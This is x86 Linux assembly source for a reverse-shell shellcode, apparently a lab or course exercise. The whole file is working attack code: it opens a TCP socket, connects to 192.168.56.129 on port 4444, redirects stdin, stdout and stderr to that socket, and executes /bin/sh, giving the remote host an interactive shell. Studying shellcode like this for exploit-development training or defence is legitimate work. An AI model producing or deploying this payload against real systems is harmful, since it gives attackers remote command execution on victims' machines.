global _start			

section .text
_start:
	
	; zero firt 5 registers to ensure there is no gargabe data from previous routines
	sub eax, eax
	xor ebx, ebx
	sub ecx, ecx
	xor edx, edx
	sub esi, esi

	; -----socket call -> socket(AF_INET /*int 2*/, SOCK_STREAM /*int 1*/,  0);
	mov ax, 0x167 ; socket syscall value 359

	mov bl, 0x2 ; AF_INET constant

	mov cl, 0x1 ; SOCK_STREAM constant

	int 0x80

	; connect call -> connect(socketfd,&serv_addr,sizeof(serv_addr))
	mov ebx, eax ; copy socket file descpriptor as the first parameter


	; construct sockaddr_in
	push edx ; char sin_zero last 4
	push edx ; char sin_zero first 4
	
	push dword 0x8138A8C0 ; 192.168.56.129 serv_addr.sin_addr.s_addr (python socket.inet_aton(ip))

	push word 0x5c11 ; serv_addr.sin_port = htons(portno);

	push word 0x2 ; serv_addr.sin_family = AF_INET; /*int 2*/
	
	mov ecx, esp ; copy &sockaddr_in into ecx as our second parameter

	; sub edx, edx ; zero edx

	mov dl, 0x10 ; sockaddr_in length as a third param

	mov ax, 0x16a ; connect syscall value 362

	int 0x80

	; ------dup2 call -> dup2(newsockfd, 0); redirect STDIN to the accepted socket
	
	xor ecx, ecx ; zero ecx

	mov al, 0x3f ; dup2 syscall value 63

	int 0x80

	; ------dup2 call -> dup2(newsockfd, 1); redirect STDOUT to the accepted socket

	inc ecx ; bump up ecx by 1 for STDOUT

	mov al, 0x3f ; dup2 syscall value 63

	int 0x80


	; ------dup2 call -> dup2(newsockfd, 2); redirect STDERR to the accepted socket

	inc ecx ; bump up ecx by 1 for STDERR

	mov al, 0x3f ; dup2 syscall value 63

	int 0x80

	; -----execve call
	sub eax, eax ; make sure eax is zero
	
	push eax ; this will be our null terminator for the "//bin/sh" string as well as act as null pointer for envp

	mov edx, esp ; envp pointer to null

	;PUSH //bin/sh (8 bytes) 

	push 0x68732f2f
	push 0x6e69622f

	
	mov ebx, esp ; target binary path - pointer to the "//bin/sh" string

	push eax ; argv and envp arrays must each include a null pointer at the end of the array. 

	mov ecx, esp ; argv[] cotaining 2 elements - pointer to //bin/sh and null pointer


	mov al, 0xb
	int 0x80



